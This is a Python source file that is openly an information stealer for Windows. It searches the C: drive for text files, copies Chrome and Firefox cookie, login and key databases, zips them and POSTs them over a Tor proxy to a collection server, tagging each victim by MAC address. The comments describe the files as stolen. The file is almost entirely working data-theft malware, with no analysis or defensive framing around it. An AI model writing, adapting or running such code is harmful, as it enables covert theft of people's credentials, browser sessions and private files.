import os # dealing with files
import sys # to check operating system
from zipfile import ZipFile
import requests # to send files
import threading # to run file sending mechanism in the background
import mimetypes # to get MIME types for files
from contextlib import ExitStack # to close files properly
from secrets import token_hex # to generate hashes to avoid file name conflicts
from getmac import get_mac_address # to get mac address
import tempfile # for using memory to temporarily store small files
import shutil # for copying files
#from .. import destroyer


URL = 'http://10.0.2.2:3285' # the URL/IP to which you want to send the stolen files/information to
AMOUNT_TO_SEND = 500.0 # How many files you want to send each time NOTE: Can also make sending by every X mb, or every X mb or X files whichever comes first
USERNAME = os.getlogin()
MAC = get_mac_address().replace(':', '') # store mac address
os.environ['HTTP_PROXY'] = 'socks5h://127.0.0.1:9050' # set global proxy variables so all requests automatically go through the Tor SOCKS5 proxy without having to specify it in every request
os.environ['HTTPS_PROXY'] = 'socks5h://127.0.0.1:9050' # ^

#file_types = ['.txt'] # if checking for multiple file types
files_found = [] # log files found.

def file_search():
    for dir, sdirs, files in os.walk('C:\\'): # dir - directories, sdirs - subdirectories
        #print(f'directory: {dir}\n \ # for testing to show all files scanned
        #      subdirectories: {sdirs}\n \
        #      files: {files}')
        for file in files:
            #if any(type in file for type in file_types): # check for multiple file types of interest. if you want to use this, comment out the next line.
            if '.txt' in file: # check file type
                #print(dir + '\\' + file) # for debugging
                files_found.append([dir + '\\' + file]) # log the found file's address
            if len(files_found) > AMOUNT_TO_SEND:
                threading.Thread(target=steal_zipped_files()) # run the file stealing mechanism in the background

def steal_zipped_files():
    count = len(files_found) # Assume new files were added which you haven't sent yet and log how many you're sending so you know how many to remove later
    zip_name = make_zip() # make the zip with all its files and save its name
    with open(zip_name, 'rb') as zip: # open the zip file in bytes so it can be sent properly
        zip_file = {'file':(zip_name, zip, 'application/zip')} # make the payload
        r = requests.post(f'{URL}/zip', headers={'mac':MAC}, files=zip_file) # send the zip file
        zip.close()
        if not 300 > r.status_code >= 200:
            pass
        else:
            os.remove(zip_name) # delete the zip file so you don't have a bunch sitting around
            del files_found[:count] # remove any files already sent from the list of files to be sent

def steal_files(): # steal files (Non-zipped version, zipped version is default)
    count = len(files_found) # Assume new files were added which you haven't sent yet and log how many you're sending so you know how many to remove later
    files = {} # progressively add more files to the payload
    with ExitStack() as stack:
        for file in files_found[:count]:
            file = file[0]
            file_name = os.path.basename(file) # get the file name from the path
            f = stack.enter_context(open(file, 'rb')) # open the file in read-only mode binary
            type = mimetypes.guess_type(file) # get the MIME type
            files["files"] = (file_name, f, type) # make the payload for the file containing the file name, the file in binary, and its MIME type and add it to the list of the payload
        r = requests.post(URL, files=files) # POST (send) the file
    if not 300 > r.status_code >= 200:
        pass
    else:
        del files_found[:count]

def make_zip():
    zip_name = f'C:/Windows/Temp/{token_hex(64)}.zip' # give every zip a random name so you don't get errors due to a zip file being open when you're trying to delete it
    with ZipFile(zip_name, 'w') as zip: # open zip file
        for file in files_found:
            # i = 0 # number next to file name in case there are more than one file with the same filename
            # # file_name = file[0]
            # if file_name in zip.namelist():
            #     while file_name+f'(duplicate {i})' in zip.namelist():
            #         i += 1
            #     file_name += f'(duplicate {i})'
            #     print(f'made duplicate {file_name}')
            zip.write(file[0], arcname=os.path.basename(file[0])) # put all the files in the zip
        zip.close()
    return zip_name

def steal_special_files():
    with tempfile.TemporaryDirectory() as temp_dir:
        user = os.getlogin()
        copy_dest = fr"{temp_dir}\files"
        os.mkdir(copy_dest)  # make the folder
        chrome_files = [fr"C:\Users\{user}\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies",
                        fr"C:\Users\{user}\AppData\Local\Google\Chrome\User Data\Login Data",
                        fr"C:\Users\{user}\AppData\Local\Google\Chrome\User Data\Login Data"]
        firefox_files = ["places.sqlite", "key4.db", "logins.json", "cookies.sqlite"]
        dir_path = fr"C:\Users\{user}\AppData\Roaming\Mozilla\Firefox\Profiles"
        files_copied = []

        for f in os.scandir(dir_path):  # scan all folders
            if f.is_dir():  # check if it is a directory
                f_copy_dest = os.path.join(copy_dest, f.name)  # prepare the destination to copy the folder's files to
                os.mkdir(f_copy_dest)  # make the folder
                for file in firefox_files:  # go through each file we're looking for
                    file_path = os.path.join(f.path, file)  # prepare the path for the file we're looking for
                    if os.path.exists(file_path):  # check if the file exists
                        file_dest = f_copy_dest + f'\\{file}'  # prepare the destination for the specific file
                        shutil.copy2(file_path, file_dest)  # copy the file
                        files_copied.append(file_dest)  # add it to the list

        zip_loc = fr"{temp_dir}\zip"
        shutil.make_archive(zip_loc, "zip", copy_dest)
        zip_loc += '.zip'  # Add .zip to the end of zip_loc because shutil.make_archive() automatically adds it so it wasn't originally included in the variable.
        with open(zip_loc, 'rb') as zip:  # open the zip file in bytes so it can be sent properly
            zip_file = {'file': (zip_loc, zip, 'application/zip')}  # make the payload.
            r = requests.post(f'{URL}/special_files', headers={'mac': MAC}, files=zip_file)  # send the zip file

threading.Thread(target=steal_special_files).start()
file_search()